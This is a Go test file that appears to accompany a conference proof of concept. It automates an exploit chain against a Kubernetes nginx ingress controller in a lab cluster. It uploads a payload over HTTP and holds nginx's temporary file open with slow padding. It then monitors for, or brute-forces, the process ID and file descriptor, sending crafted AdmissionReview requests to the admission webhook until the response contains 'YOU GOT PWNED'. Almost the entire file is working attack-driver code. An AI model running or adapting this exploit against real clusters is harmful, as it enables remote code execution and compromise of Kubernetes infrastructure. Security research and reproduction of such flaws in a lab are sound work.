package ekoparty

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

type testLogger struct {
	t *testing.T
}

func (l *testLogger) Log(format string, args ...interface{}) {
	l.t.Helper()
	l.t.Logf("\t"+format, args...)
}

func TestCluster_Create(t *testing.T) {
	ctx := context.Background()
	cluster, err := New(ctx)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	if cluster == nil {
		t.Fatal("New() returned nil cluster")
	}
}

func TestCluster_Destroy(t *testing.T) {
	ctx := context.Background()
	cluster, err := New(ctx)
	if err != nil {
		t.Skipf("cluster not available: %v", err)
	}

	if err := cluster.Destroy(ctx); err != nil {
		t.Fatalf("Destroy() error = %v", err)
	}
}

func TestPoC(t *testing.T) {
	ctx := context.Background()
	bruteForce := os.Getenv("BRUTE_FORCE") == "true"

	mode := "monitoring"
	if bruteForce {
		mode = "brute_force"
	}
	t.Logf("\tmode=%s", mode)

	cluster, err := NewWithLogger(ctx, &testLogger{t})
	if err != nil {
		t.Fatalf("NewWithLogger() error = %v", err)
	}

	if err := cluster.CreateExecutor(ctx); err != nil {
		t.Fatalf("CreateExecutor() error = %v", err)
	}

	if err := cluster.UpdateNginxConfig(ctx); err != nil {
		t.Fatalf("UpdateNginxConfig() error = %v", err)
	}

	if err := cluster.RestartIngress(ctx); err != nil {
		t.Fatalf("RestartIngress() error = %v", err)
	}

	if err := cluster.CompilePoc(ctx); err != nil {
		t.Fatalf("CompilePoc() error = %v", err)
	}

	nginxPod, err := cluster.IngressPod(ctx)
	if err != nil {
		t.Fatalf("IngressPod() error = %v", err)
	}
	t.Logf("\ttarget_pod=%s", nginxPod)

	if !bruteForce {
		if err := cluster.CreateDebugContainer(ctx, nginxPod); err != nil {
			t.Fatalf("CreateDebugContainer() error = %v", err)
		}
	}

	httpPort := 8080
	httpsPort := 8443

	httpStop := make(chan struct{}, 1)
	httpReady := make(chan struct{})
	go func() {
		cluster.ForwardServicePort(ctx, httpPort, httpStop, httpReady)
	}()
	waitForPortForward(t, httpReady, "http", httpPort)
	defer close(httpStop)

	httpsStop := make(chan struct{}, 1)
	httpsReady := make(chan struct{})
	go func() {
		cluster.ForwardPodPort(ctx, nginxPod, 8443, httpsPort, httpsStop, httpsReady)
	}()
	waitForPortForward(t, httpsReady, "https", httpsPort)
	defer close(httpsStop)

	payload, err := cluster.Payload(ctx)
	if err != nil {
		t.Fatalf("Payload() error = %v", err)
	}
	t.Logf("\tpayload_size=%d", len(payload))

	if bruteForce {
		runBruteForce(t, ctx, cluster, nginxPod, httpPort, httpsPort, payload)
	} else {
		runMonitoring(t, ctx, cluster, nginxPod, httpPort, httpsPort, payload)
	}
}

func runBruteForce(t *testing.T, ctx context.Context, cluster *Cluster, nginxPod string, httpPort, httpsPort int, payload []byte) {
	t.Helper()

	conn, err := sendExploitPayload(t, httpPort, payload)
	if err != nil {
		t.Fatalf("sendExploitPayload() error = %v", err)
	}
	defer conn.Close()

	paddingDone := make(chan struct{})
	stopPadding := make(chan struct{}, 1)
	go sendPadding(t, conn, len(payload), paddingDone, stopPadding)

	t.Logf("\twaiting for disk write...")
	time.Sleep(20 * time.Second)

	workers := 200
	totalCombos := (100 - 20 + 1) * (100 - 3 + 1)

	t.Logf("\tbrute force config workers=%d, total=%d", workers, totalCombos)

	workerCtx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobs := make(chan struct{ pid, fd int }, workers*3)
	success := make(chan struct{ pid, fd int }, 1)

	var wg sync.WaitGroup

	// Atomic flag to ensure only ONE success is reported
	var successReported atomic.Bool

	// Each worker tracks its own pid/fd and reports success directly
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-workerCtx.Done():
					return
				case job, ok := <-jobs:
					if !ok {
						return
					}

					// Skip if already found
					if successReported.Load() {
						return
					}

					admissionPayload, err := GenerateAdmissionReview(job.pid, job.fd)
					if err != nil {
						continue
					}

					// Check if this specific request succeeded
					if sendAdmissionReviewFast(t, httpsPort, admissionPayload, job.pid, job.fd) {
						// Use atomic to ensure only first success is reported
						if successReported.CompareAndSwap(false, true) {
							select {
							case success <- struct{ pid, fd int }{job.pid, job.fd}:
							default:
							}
							cancel()
						}
						return
					}
				}
			}
		}(i)
	}

	// Generates all combinations as fast as possible
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer close(jobs)

		start := time.Now()
		sent := 0

		for pid := 20; pid <= 100; pid++ {
			for fd := 3; fd <= 100; fd++ {
				select {
				case <-workerCtx.Done():
					t.Logf("\tproducer stopped after %d jobs in %v", sent, time.Since(start))
					return
				case jobs <- struct{ pid, fd int }{pid, fd}:
					sent++
					if sent%1000 == 0 {
						elapsed := time.Since(start)
						rate := float64(sent) / elapsed.Seconds()
						t.Logf("\tprogress: %d/%d (%.1f%%) - %.0f req/s",
							sent, totalCombos,
							float64(sent)/float64(totalCombos)*100,
							rate)
					}
				}
			}
		}

		t.Logf("\tall %d jobs queued in %v", sent, time.Since(start))
	}()

	// Wait for result
	select {
	case result := <-success:
		t.Logf("\t🎉 exploit success! pid=%d fd=%d", result.pid, result.fd)
		cancel()

	case <-paddingDone:
		t.Log("\tpadding completed without success")
		cancel()

	case <-time.After(5 * time.Minute):
		t.Log("\ttimeout waiting for exploit")
		cancel()
	}

	// Cleanup
	select {
	case stopPadding <- struct{}{}:
	default:
	}
	<-paddingDone

	wg.Wait()

	time.Sleep(2 * time.Second)
	showPodLogs(t, ctx, cluster, nginxPod)
}

func runMonitoring(t *testing.T, ctx context.Context, cluster *Cluster, nginxPod string, httpPort, httpsPort int, payload []byte) {
	t.Helper()

	fdDetected := make(chan struct {
		pid string
		fd  string
	}, 1)
	fdMonitorStop := make(chan struct{})
	fdMonitorDone := make(chan struct{})

	go monitorFDs(ctx, t, cluster, nginxPod, len(payload), fdDetected, fdMonitorStop, fdMonitorDone)
	defer func() {
		close(fdMonitorStop)
		<-fdMonitorDone
	}()

	conn, err := sendExploitPayload(t, httpPort, payload)
	if err != nil {
		t.Fatalf("sendExploitPayload() error = %v", err)
	}
	defer conn.Close()

	paddingDone := make(chan struct{})
	stopPadding := make(chan struct{}, 1)
	go sendPadding(t, conn, len(payload), paddingDone, stopPadding)

	var detected struct {
		pid string
		fd  string
	}

	select {
	case detected = <-fdDetected:
		t.Logf("\tfd_detected pid=%s, fd=%s", detected.pid, detected.fd)
	case <-paddingDone:
		t.Fatal("padding completed before fd detection")
	case <-time.After(3 * time.Minute):
		t.Fatal("timeout waiting for fd detection")
	}

	pid, err := strconv.Atoi(detected.pid)
	if err != nil {
		t.Fatalf("invalid pid %q: %v", detected.pid, err)
	}

	fd, err := strconv.Atoi(detected.fd)
	if err != nil {
		t.Fatalf("invalid fd %q: %v", detected.fd, err)
	}

	admissionPayload, err := GenerateAdmissionReview(pid, fd)
	if err != nil {
		t.Fatalf("GenerateAdmissionReview() error = %v", err)
	}

	t.Logf("\tsending admission review pid=%d, fd=%d", pid, fd)
	sendAdmissionReviewFast(t, httpsPort, admissionPayload, pid, fd)

	select {
	case stopPadding <- struct{}{}:
	default:
	}
	<-paddingDone

	time.Sleep(5 * time.Second)

	showPodLogs(t, ctx, cluster, nginxPod)
}

func showPodLogs(t *testing.T, ctx context.Context, cluster *Cluster, podName string) {
	t.Helper()

	logs, err := cluster.Logs(ctx, podName, 100)
	if err != nil {
		t.Errorf("\tfailed to get logs: %v", err)
		return
	}

	t.Log("\tnginx pod logs")
	for _, line := range strings.Split(logs, "\n") {
		if line != "" {
			t.Logf("\t%s", line)
		}
	}
	// nginx pods logs (30 lines)
}

func monitorFDs(ctx context.Context, t *testing.T, cluster *Cluster, podName string, expectedSize int,
	detected chan struct {
		pid string
		fd  string
	}, stopCh, doneCh chan struct{}) {
	t.Helper()
	defer close(doneCh)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopCh:
			return
		case <-ticker.C:
			pid, fd, err := cluster.MonitorDeletedFDs(ctx, podName, int64(expectedSize))
			if err != nil {
				continue
			}

			t.Logf("\tdeleted fd found pid=%s, fd=%s, size=%d", pid, fd, expectedSize)

			select {
			case detected <- struct {
				pid string
				fd  string
			}{pid, fd}:
			default:
			}
			return
		}
	}
}

func sendExploitPayload(t *testing.T, port int, payload []byte) (net.Conn, error) {
	t.Helper()

	var body bytes.Buffer
	body.WriteString("POST /fake/path HTTP/1.1\r\n")
	body.WriteString("Host: ekoparty.com\r\n")
	body.WriteString("User-Agent: ekoparty/1.0\r\n")
	body.WriteString("Content-Type: application/octet-stream\r\n")
	body.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(payload)*2))
	body.WriteString("Connection: keep-alive\r\n")
	body.WriteString("\r\n")
	body.Write(payload)

	target := fmt.Sprintf("localhost:%d", port)
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", target, err)
	}

	if _, err := conn.Write(body.Bytes()); err != nil {
		conn.Close()
		return nil, fmt.Errorf("write payload: %w", err)
	}

	time.Sleep(2 * time.Second)
	return conn, nil
}

func sendPadding(t *testing.T, conn net.Conn, size int, done, stop chan struct{}) {
	t.Helper()
	defer close(done)

	padding := bytes.Repeat([]byte{0}, size)
	sent := 0

	for sent < size {
		select {
		case <-stop:
			t.Log("\tpadding stopped!")
			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.CloseWrite()
				io.Copy(io.Discard, tcpConn)
			}
			conn.Close()
			return
		default:
		}

		time.Sleep(10 * time.Second)

		chunk := 1024
		if remaining := size - sent; remaining < chunk {
			chunk = remaining
		}

		if _, err := conn.Write(padding[sent : sent+chunk]); err != nil {
			t.Logf("\tpadding error: %v", err)
			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.CloseWrite()
				io.Copy(io.Discard, tcpConn)
			}
			conn.Close()
			return
		}

		sent += chunk
		if sent%(1024*4) == 0 {
			t.Logf("\tpadding progress sent_kb=%d, total_kb=%d", sent/1024, size/1024)
		}
	}

	t.Log("\tpadding complete")

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.CloseWrite()
		io.Copy(io.Discard, tcpConn)
	}

	conn.Close()
}

func sendAdmissionReviewFast(t *testing.T, port int, payload []byte, pid, fd int) bool {
	t.Helper()

	client := getHTTPClient()

	req, err := http.NewRequest("POST", fmt.Sprintf("https://localhost:%d", port), bytes.NewReader(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)

	var admissionResp struct {
		Response struct {
			Allowed bool `json:"allowed"`
			Status  struct {
				Code    int    `json:"code"`
				Message string `json:"message"`
			} `json:"status"`
		} `json:"response"`
	}

	if err := json.Unmarshal(respBody, &admissionResp); err == nil {
		msg := admissionResp.Response.Status.Message
		// Check if it's a REAL success (not nginx error)
		if strings.Contains(msg, "YOU GOT PWNED") && !strings.Contains(msg, "[emerg]") && !strings.Contains(msg, "error:") && !strings.Contains(msg, "ENGINE_by_id") {
			return true
		}
	}
	return false
}

// HTTP client pool shared across all requests
var (
	httpClient     *http.Client
	httpClientOnce sync.Once
)

func getHTTPClient() *http.Client {
	httpClientOnce.Do(func() {
		httpClient = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
				MaxIdleConns:        1000,
				MaxIdleConnsPerHost: 1000,
				MaxConnsPerHost:     1000,
				IdleConnTimeout:     30 * time.Second,
				DisableKeepAlives:   false,
			},
			Timeout: 2 * time.Second,
		}
	})
	return httpClient
}

func waitForPortForward(t *testing.T, ready chan struct{}, name string, port int) {
	t.Helper()

	select {
	case <-ready:
		t.Logf("\tport forward ready name=%s, port=%d", name, port)
	case <-time.After(10 * time.Second):
		t.Fatalf("\tport forward timeout name=%s", name)
	}
}
